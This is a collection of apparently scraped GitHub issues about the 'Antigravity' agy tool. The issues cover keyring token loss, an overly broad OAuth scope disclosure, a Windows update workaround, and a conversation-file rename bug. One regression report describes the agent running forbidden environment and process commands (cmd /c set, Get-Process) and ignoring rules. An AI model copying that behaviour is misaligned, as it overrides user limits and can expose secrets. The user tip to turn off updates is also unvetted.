   deletes it rather than retrying once the backend is actually ready.

Ruled out as causes:
- GNOME Keyring/libsecret — confirmed functional via manual secret-tool round trip,
  and gh auth status persists fine across restarts using the same keyring.
- libssl1.1 — confirmed installed via ldconfig -p | grep libssl.so.1.1, no change
  in behavior.
- "password-store": "gnome-libsecret" forced in argv.json — no change.
- encryption.migratedToGnomeLibsecret flag — already `true` and stable across
  restarts, ruling out a re-migration loop.

state.vscdb query outputs (chronological):

# Right after sign-in:
secret://{"extensionId":"vscode.github-authentication","key":"github.auth"}|709

# Immediately after full shutdown (process confirmed gone via ps aux):
secret://{"extensionId":"vscode.github-authentication","key":"github.auth"}|709

# Immediately after next relaunch:
secret://{"extensionId":"vscode.github-authentication","key":"github.auth"}|709

# A few seconds later, app idle, no interaction:
(empty result — row deleted)

Happy to attach the full raw logs as a file if the form supports it.

items.title: Security: agy's OAuth login is granted full `cloud-platform` scope, broader than the consent screen implies

labels.name: others
labels.description: Issues not falling in bug, performance, support, build and install or feature

items.body:
## Summary

The OAuth credential `agy` issues on sign-in is granted the `https://www.googleapis.com/auth/cloud-platform` scope - Google's broadest GCP scope ("See, edit, configure, and delete your Google Cloud data"). The consent screen presents this as "Antigravity" access, so users have no indication the resulting token can reach their whole GCP account.

## Evidence

Querying Google's `tokeninfo` endpoint with a freshly issued token (`auth_method: consumer`) returns:

```
scope: email profile openid
       https://www.googleapis.com/auth/userinfo.email
       https://www.googleapis.com/auth/userinfo.profile
       https://www.googleapis.com/auth/cloud-platform      <-- full GCP access
       https://www.googleapis.com/auth/cclog
       https://www.googleapis.com/auth/experimentsandconfigs
```

## Why it's a concern

- **Blast radius:** if this token leaks, it's not scoped to Antigravity - it can manage Cloud Run, GCS, Secret Manager, VMs, etc.
- **Invisible to the user:** the consent screen's Antigravity branding doesn't surface `cloud-platform`.

## Suggestions

Request the narrowest scope agy actually needs, rather than blanket `cloud-platform`.

Related: #78 (API-key auth for headless environments).

items.title: [Workaround] Fix for Antigravity Windows Update self-deletion loop

labels.name: others
labels.description: Issues not falling in bug, performance, support, build and install or feature

items.body:
### [FIX] Antigravity 2.0 Update Bug / Vanishing IDE App

**Context:** 
If your Antigravity standalone app/IDE suddenly vanished or uninstalled itself after a recent background update, it's likely stuck in a broken installation loop. Instead of doing a full purge, deleting `AppData` folders, or wasting time re-downloading the entire package from the official site, you can force the pending update to complete manually.

**The Fix I Found:**
1. Open the Run dialog (`Win + R`), type `%LocalAppData%`, and hit **Enter**.
2. Navigate to the `antigravity` folder and look for the `staging` (or `pending`) subdirectory.
3. Locate the **`antigravity-X64.exe`** file inside that folder.
4. **Double-click and run it directly.** 

Running the cached executable manually forces the installer to execute properly, fixes the broken shortcuts, and restores the application instantly. 

**Result:** 
The IDE or the standalone app launches perfectly, and all your existing configurations, themes, extensions, and project histories remain **100% intact**. 

*(Optional Tip: Once you are back in, go to Settings -> search 'update' -> change Update Mode to 'None' to prevent the background agent from breaking it again on the next reboot).*

items.title: [BUG/REGRESSION] Severe efficiency loss and "Bureaucratic Loop" in v1.0.8

labels.name: performance
labels.description: Performance issues (e.g., hanging processes, infinite model loops, memory leak)

labels.name: regression issue
labels.description: To spot regression issues from previous updates

items.body:
### Description
Antigravity CLI (v1.0.8) with Gemini 3.5 Flash is currently unusable for simple tool-based tasks. It performs excessive system reconnaissance and ignores explicit instructions in GEMINI.md.

### Behavior observed
- For a simple SELECT COUNT(*) query using a configured MCP server, the agent spends 100k+ tokens on "Thoughts".
- It ignores the DIRECT ACTION MANDATE in GEMINI.md.
- It attempts to call cmd /c set, ps, and Get-Process even when explicitly forbidden in settings and rules.
- It enters a recursive loop of investigating tool structure instead of executing the tool.

### Comparison to Gemini CLI
The legacy Gemini CLI was a "Direct Action Agent" that executed tools in 1 turn. The new Antigravity CLI is a "Bureaucratic Orchestrator" that wastes minutes of developer time for a 1-second task.

### Steps to reproduce
1. Add a strict mandate to GEMINI.md to use MCP tools directly.
2. Run agy and ask for a simple database count.
3. Observe the agent spending minutes on environment checks and subagent delegation instead of tool execution.

### Expectation
The agent should trust mcp_config.json and follow instructions in GEMINI.md to skip environment checks and use native tool calls immediately.

items.title: Windows: agy --print aborts mid-conversation on "rename .tmp → .pb: Access is denied"

labels.name: subtype:windows
labels.description: Windows specific issues (e.g., login links, PowerShell statusline)

labels.name: comp:conversations
labels.description: Managing Conversations, Workspace Scoping, Resuming sessions, Branching

items.body:
## Summary

On Windows 11 with `agy` v1.0.2, non-interactive `agy --print` invocations sporadically abort mid-conversation when agy fails to atomically rename the per-conversation `.tmp` file to its final `.pb` form in `~/.gemini/antigravity-cli/conversations/`. The model has only emitted a few dozen characters when this happens, and the entire conversation is dropped.

Distinct from #76 (empty stdout): in this bug, the model **never gets to finish** — generation stops at ~tens of chars. In #76, the model finishes but stdout is not flushed.

## Symptom

In `~/.gemini/antigravity-cli/log/cli-YYYYMMDD_HHMMSS.log`:

```
E0528 15:34:47.716869 41532 log.go:398] rename C:/Users/nahue/.gemini/antigravity-cli/conversations/97f8d4ac-09b5-44a2-b985-2b82c18977cd.023fa28d-98a8-4e0f-938b-da93bd9487f5.tmp C:/Users/nahue/.gemini/antigravity-cli/conversations/97f8d4ac-09b5-44a2-b985-2b82c18977cd.pb: Access is denied.
I0528 15:34:47.837049 41532 manager.go:459] CLI store manager shutting down
I0528 15:34:47.837709 41532 conversation_manager.go:346] Stopping conversation stream
I0528 15:34:47.838266 41532 server.go:2186] Language server shutting down
```

Preceding `text_drip.go` line shows the model had emitted only a small fraction of the intended response:

```
I0528 15:34:46.084463 41532 text_drip.go:173] Drip stopped: lastStepIdx=2, charIdx=45, length=65
```

`length=65` chars when the user asked for a multi-paragraph research report — the model never got to finish.

## Repro conditions

- **OS**: Windows 11 Home, 10.0.26200
- **agy version**: 1.0.2
- **Invocation context**: `agy --print` called from a subprocess (Git Bash via Claude Code plugin); non-TTY stdout. Same context where #76 manifests.
- **Frequency**: ~25% of invocations in a busy session (4 failures out of ~16 invocations in a 2-day window). Highly non-deterministic — same prompt re-run often succeeds.
- **Authentication**: OAuth via keyring (`authMethod=consumer`).

## Likely root cause

The conversation manager writes the conversation protobuf to a `<uuid>.<random>.tmp` and then calls `os.Rename(tmp, finalPath)`. On Windows, `os.Rename` returns `ERROR_ACCESS_DENIED` if **any** process holds a file handle on either the source or destination — including:

1. **Windows Defender** real-time scan opening the `.tmp` just after write to inspect it (very common when AV is active).
2. **Stale handles** from a previous agy process that crashed without releasing the file (common on `SIGKILL` or hard reboot).
3. **OneDrive / third-party sync clients** indexing the dir (less likely under `%USERPROFILE%\.gemini` but possible).

## Reliable workaround we ship in our wrapper

Before every `agy --print` call, sweep stale `.tmp` files older than 5 minutes from the conversations dir:

```bash
find "$HOME/.gemini/antigravity-cli/conversations" -name '*.tmp' -mmin +5 -delete 2>/dev/null || true
```

After `agy --print` exits 0, verify the expected output file actually exists. If not, tail the latest cli log for `rename .* Access is denied` — if matched, retry once. This catches the bug case without blanket-retrying issue #76 occurrences.

With this mitigation our success rate went from ~75% to 100% across ~20 subsequent invocations in the same session that had the original failures.

## Suggested upstream fix (in priority order)

1. **Retry the rename with exponential backoff inside agy.** On Windows, transient AV file locks usually clear within 100–500 ms. A retry loop with `time.Sleep(100ms * 2^attempt)` up to 3 attempts would fix most cases without user-visible impact.
2. **Don't tear down the conversation on persistence failure.** A persistence rename failure should be logged; the conversation should continue in memory — the user lost no model output, agy lost only the ability to resume the conversation later. Today the model generation is aborted, which is the much more visible failure.
3. **Document the gotcha in the troubleshooting section** alongside #76. They have the same symptom from the user's POV ("agy returned nothing"); distinguishing them requires reading the log.

## Reference

Found while testing our Claude Code plugin wrapper for `agy`. Cross-reference: #76 (empty stdout — related but distinct).
